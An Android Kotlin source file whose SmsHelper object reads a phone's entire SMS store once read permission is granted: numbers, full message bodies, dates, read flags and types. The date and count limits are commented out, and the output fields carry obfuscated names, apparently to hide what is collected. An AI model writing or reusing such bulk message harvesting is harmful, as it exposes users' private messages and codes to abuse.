package com.bigdata.lib

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import com.bigdata.lib.bean.SmsInfo
import com.bigdata.lib.net.BaseParamsManager
import com.util.lib.log.isDebug
import com.util.lib.log.logger_e
import com.util.lib.log.logger_i

/**
 * Created by weishl on 2020/12/31
 *
 */
object SmsHelper {

    private const val TAG = "debug_SmsHelper"
    private const val MAX_ITEM = 1000//短信抓取最大条数

    /**
     * 获取短信信息
     */
    @JvmStatic
    fun getMessage(context: Context): ArrayList<SmsInfo> {
        val list = arrayListOf<SmsInfo>()
        if (BaseParamsManager.isPermissionAuth(
                context, Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return list
        }

        try {
            val resolver = context.contentResolver
            val uri = Uri.parse("content://sms/")
            val cursor = resolver.query(
                uri,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.READ,
                    Telephony.Sms.STATUS,
                    Telephony.Sms.TYPE
                ),
                /*"date>?"*/null,
                /*arrayOf(MCLCManager.getLast_6_Month_time().toString())*/null,
                /*"date DESC limit $MAX_ITEM"*/null
            )
            cursor?.use {
                var info: SmsInfo
                while (cursor.moveToNext()) {
                    info = SmsInfo()

                    //如果是已发出信息就是收件人手机号 如果是收到的信息就是发件人的手机号
                    info.nKYZyncfJM = getString(cursor, Telephony.Sms.ADDRESS)
                    info.mLAbob = getString(cursor, Telephony.Sms.BODY)//短信具体内容
                    info.S6G6Y3xr = getLong(cursor, Telephony.Sms.DATE)// 接受时间
                    info.YNcz54 = getString(cursor, Telephony.Sms.READ)//是否阅读0未读，1已读
//                    info.status = getString(cursor, Telephony.Sms.STATUS)//短信状态,-1 接收，0 complete,64 pending128 failed
                    info.h18jUUhUq = getString(cursor, Telephony.Sms.TYPE)//短信类型 ALL = 0;INBOX = 1;SENT = 2;DRAFT = 3;OUTBOX = 4;FAILED = 5; QUEUED = 6;
                    info.nKYZyncfJM?.let {
                        var temp = it.replace("+", "").replace("-", "").replace(" ", "")
                        if (temp.startsWith("57")) {
                            temp = temp.substring(2)
                        }
                        if (temp.startsWith("0")) {
                            temp = temp.substring(1)
                        }
                        info.puN3px = temp
                    }
                    list.add(info)
                }
                if (isDebug()) {
                    logger_i(TAG, " getmessage = $list")
                }
            }

        } catch (e: Exception) {
            logger_e(TAG, " getmessage e = $e")
        }
        return list
    }

    private fun getString(cursor: Cursor, type: String): String? {
        val index = cursor.getColumnIndex(type)
        if (index != -1) {
            return cursor.getString(index)
        }
        return null
    }

    private fun getLong(cursor: Cursor, type: String): Long {
        val index = cursor.getColumnIndex(type)
        if (index != -1) {
            return cursor.getLong(index)
        }
        return 0
    }
}